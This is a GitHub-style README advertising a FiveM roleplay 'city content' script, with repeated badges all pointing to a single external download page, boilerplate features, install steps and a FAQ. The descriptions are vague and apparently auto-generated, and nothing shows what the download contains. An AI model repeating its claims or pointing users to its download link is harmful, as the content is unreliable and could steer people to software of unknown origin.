# Nova Uni o RP v2026 - Game Script Utility 2026

> **FiveM city content for GTA RP communities.** Made for roleplay servers that want to add or showcase urban content inside an existing setup.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ethanrbcooper1256/nova-unio-rp-update-script?style=flat-square)](https://github.com/ethanrbcooper1256/nova-unio-rp-update-script)

---

<p align="center">
  <a href="https://ethanrbcooper1256.github.io/nova-unio-rp-update-script/">
    <img src="https://img.shields.io/badge/Download-Nova%20Uni%20o%20RP%20Script-brightgreen?style=for-the-badge" alt="Download Nova Uni o RP Script">
  </a>
</p>

> **[Direct Download - Nova Uni o RP](https://ethanrbcooper1256.github.io/nova-unio-rp-update-script/)**

---

[Download Latest Build](https://ethanrbcooper1256.github.io/nova-unio-rp-update-script/)

---

## Project Summary

Nova Uni o RP is a FiveM resource created for GTA RP servers that need packaged city content for roleplay-driven environments. Its layout is centered on presentation and easy integration, so it fits best as an added resource within an existing server rather than as a separate game mode.

The goal of the project is to provide a city-oriented RP package that can sit alongside other server resources. If you run a GTA RP server and want content that matches a particular urban style or presentation flow, this script is structured to drop into that FiveM workflow cleanly.

## Included Features

- City-centered roleplay content package for GTA RP setups
- Resource format compatible with FiveM servers
- Built to support city presentation in RP environments
- Intended for use inside existing server configurations
- Appropriate for GTA RP communities and city-based scenes
- Resource-based structure for server organization
- Works alongside other FiveM content in a larger stack
- Released as the 2026 version of the Nova Uni o RP project

## Installation

1. Download the latest build from the link above.
2. Place the resource folder into your FiveM server resources directory.
3. Add the resource to your server configuration.
4. Restart the server or refresh resources so FiveM loads the package.

Example server config entry:

start nova-uni-rp-script-fivem-city-content

If your server uses a different resource folder name, adjust the entry to match the folder you installed.

## Configuration Notes

Because this project is delivered as a resource, setup details are usually driven by how your server organizes its content. When you need to control startup order or activate the package manually, the key step is declaring the server resource.

| Setting | Purpose | Example |
| --- | --- | --- |
| Resource folder | Stores the script files | `nova-uni-rp-script-fivem-city-content` |
| Server start entry | Loads the resource in FiveM | `start nova-uni-rp-script-fivem-city-content` |
| Load order | Controls when the content starts | Place near related RP resources |
| Server refresh | Rebuilds loaded resources | `refresh` then `start ...` |

## Compatibility

- Platform: FiveM
- Category: GTA RP city content
- Intended for roleplay servers and city-themed setups
- Best used inside an existing server resource stack
- Compatibility may depend on your current server layout and other installed resources

## FAQ

### How do I install it?
Get the build, copy it into your FiveM resources folder, and add a `start` line to your server configuration.

### Can it run with other RP resources?
Yes. It is meant to be part of a broader GTA RP server build, as long as your resource layout supports it.

### Does it need a specific city framework?
No framework is listed in the extracted details. Use it within your server's current resource structure.

### What happens if I rename the folder?
That is fine, but your server config must reference the same folder name when starting the resource.

### Where should the files be stored?
Keep them in your server's resources directory or wherever you normally place FiveM content packages.

### How do I update it?
Swap the old resource files for the latest build, then refresh or restart the server so FiveM loads the newer version.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
